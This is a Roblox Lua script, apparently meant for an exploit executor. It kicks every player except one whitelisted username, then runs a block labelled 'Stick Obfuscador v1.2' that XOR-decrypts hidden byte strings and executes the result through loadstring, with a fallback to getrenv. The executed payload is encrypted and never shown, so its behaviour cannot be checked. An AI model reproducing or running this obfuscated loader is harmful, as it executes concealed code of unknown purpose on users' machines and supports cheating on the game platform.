-- 🔐 USUARIOS AUTORIZADOS
local authorizedUsers = {"Itscruzito1"}
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
if not localPlayer then return end
local isAuthorized = false
for _, u in ipairs(authorizedUsers) do if u == localPlayer.Name then isAuthorized = true break end end
if not isAuthorized then pcall(function() localPlayer:Kick("RESET HWID - No autorizado") end) return end

--[[ Stick Obfuscador v1.2 ]]
local _M
do _M=function()
local _1_l_i1illI1={"\x09\xE3\x33\xCE\xA1\xA4\x29\x17\xFA\xFF\x37\x54\x44\x36";"\x01\xA7\xAD\x58\x08\x29\xF5\x53\xF2\xC6\x6E\x5A\x92\xE1\xA0\x20\x6A";"\xF6\x24\x01\xF3\x6E\x55\x93\xF9\x0C\x2F\xCD\xBD\x29\x13\xC5\x02\x5D\xDF\xF3\x40\x23\xFA\xA6\xBE\x8E\x9B\x4A\x44";"\x28\x99\xD5\x79\x15\xCC\x50\x36\xC3\xF1\x06\x6B\xE9\x9B\x45\xCA\x8D\x02\x55";"\x7D\x85\xCC\x2C\x63\x01\xC3\xBB\x13\xE6\x14\x74\xA6\xC9\xCD\x5B\x4E";"\xF6\x09\x09\xF4\xA1\xA0\x50\xFB\x26\x6F\xAA\xD7\x6C\x37\x2C\xE1\x54\x8D\xF5\x19\x7B\xDB\xAB\xD8";"\x98\x7D\xFC\x0C\x14\x21\xEE\x8F\x6F\x08\xAC\x95\x95\xFA";"\xE0\x0F\x5D\xBB\xB9\x87\x7D\x20\xD5\x7D\xDC\x86\x1D\x7B\x05\xC4\xA9\x4E\x20\x00\x42"}
local _illIII11_l2={0x82,0x72,0x4,0xEA,0x8C,0xA1,0x7D,0x27,0xC9}
local _I11_l_i1il3={0x8,0x6,0x3,0x7,0x5,0x2,0x4,0x1}
local _1_l_i1illI2s={0x11,0x30,0x4F,0x6E,0x8D,0xAC,0xCB,0xEA}
local _i1illIII114={0x1,0x1,0x1,0x2,0x1,0x3,0x1,0x4,0x1,0x5,0x1,0x6,0x1,0x7,0x1,0x8,0x2,0x3}
local __i1illIII16,_lIII11_l_i17,__l_i1illII8=string.char,string.byte,table.concat
local _II11_l_i1i5
do
 local _b32=bit32
 if _b32 and _b32.bxor then _II11_l_i1i5=_b32.bxor
 else _II11_l_i1i5=function(a,b) local r,p=0,1 for _=1,8 do local x,y=a%2,b%2 if x~=y then r=r+p end a=(a-x)/2 b=(b-y)/2 p=p*2 end return r end
 end
end
local _illIII11_l11
local function _llIII11_l_9(_i1illIII115,_1_l_i1illI2) local _I11_l_i1il4={} for _illIII11_l3=1,#_i1illIII115 do local z=_lIII11_l_i17(_i1illIII115,_illIII11_l3) z=_II11_l_i1i5(z,_illIII11_l2[((_illIII11_l3-1)%#_illIII11_l2)+1]) z=_II11_l_i1i5(z,(_1_l_i1illI2+(_illIII11_l3-1)*13)%256) _I11_l_i1il4[_illIII11_l3]=__i1illIII16(z) end return __l_i1illII8(_I11_l_i1il4) end
local _I11_l_i1il12,_1_l_i1illI10=1,{}
while _I11_l_i1il12<=#_i1illIII114 do local _i1illIII1113=_i1illIII114[_I11_l_i1il12] if _i1illIII1113==1 then local _II11_l_i1i6=_i1illIII114[_I11_l_i1il12+1] _1_l_i1illI10[_II11_l_i1i6]=_llIII11_l_9(_1_l_i1illI1[_I11_l_i1il3[_II11_l_i1i6]],_1_l_i1illI2s[_II11_l_i1i6]) _I11_l_i1il12=_I11_l_i1il12+2 elseif _i1illIII1113==2 then _illIII11_l11=__l_i1illII8(_1_l_i1illI10) _I11_l_i1il12=_I11_l_i1il12+1 elseif _i1illIII1113==3 then break else _I11_l_i1il12=_I11_l_i1il12+1 end end
local __l_i1illII0=__i1illIII16(108,111,97,100,115,116,114,105,110,103)
local _llIII11_l_1=getfenv and getfenv() or _ENV or _G
local _lIII11_l_i116=loadstring or load
if not _lIII11_l_i116 and _llIII11_l_1 then _lIII11_l_i116=_llIII11_l_1[__l_i1illII0] end
if not _lIII11_l_i116 and getrenv then local r=getrenv() _lIII11_l_i116=r.loadstring or r.load end
if not _lIII11_l_i116 then error("sin loadstring") end
local _II11_l_i1i14,__i1illIII115=_lIII11_l_i116(_illIII11_l11)
if not _II11_l_i1i14 then error(__i1illIII115) end
if setfenv and getfenv then pcall(setfenv,_II11_l_i1i14,getfenv()) end
return _II11_l_i1i14()
end end
return _M()
